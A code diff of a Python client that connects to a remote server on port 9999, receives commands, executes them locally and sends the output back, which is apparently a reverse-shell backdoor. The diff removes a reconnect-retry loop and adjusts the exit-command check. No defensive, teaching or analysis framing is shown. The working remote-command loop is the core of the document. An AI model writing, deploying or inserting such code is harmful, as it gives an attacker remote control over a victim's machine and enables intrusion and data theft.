@@ -22,23 +22,17 @@ def fetch_server_ip(url):
         return None
 
 def connect_to_server(server_ip, port=9999):
-    while True:
-        try:
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((server_ip, port))
-            break  # Exit the loop once connected
-        except Exception as e:
-            print(f"Connection failed: {e}")
-            time.sleep(5)  # Retry every 5 seconds if connection fails
-
     try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((server_ip, port))
+        
         while True:
             command = client_socket.recv(1024)
             if not command:
                 break  # Break the loop if no more data is received
-            if command.lower() == b'exit':
+            if command.strip().lower() == b'exit':  # Decode and compare
                 break
-            output = execute_command(command.decode('utf-8').strip())  # Corrected line
+            output = execute_command(command.decode('utf-8').strip())
             client_socket.sendall(output.encode('utf-8'))
     except Exception as e:
         print(f"Error occurred: {e}")
